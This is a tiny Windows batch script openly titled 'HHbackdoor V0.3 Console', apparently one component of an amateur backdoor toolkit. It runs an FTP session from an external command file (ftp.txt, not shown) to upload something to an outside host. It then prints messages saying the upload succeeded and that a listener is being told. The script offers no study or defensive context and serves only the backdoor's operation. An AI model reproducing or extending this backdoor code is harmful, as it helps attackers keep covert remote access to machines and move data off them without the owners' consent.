rem console nonftp HHB V0.3 L.I
@echo off
color 0a
title HHbackdoor V0.3 Console 
:startupload
cls
ftp -s:ftp.txt
echo upload port succesfull
echo Telling to listener ...
exit